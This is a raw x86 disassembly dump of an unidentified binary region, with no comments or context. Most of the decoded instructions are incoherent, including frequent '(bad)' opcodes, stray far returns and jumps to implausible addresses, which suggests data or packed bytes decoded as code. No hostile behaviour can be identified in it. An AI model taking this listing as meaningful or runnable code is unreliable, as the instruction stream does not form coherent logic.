  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
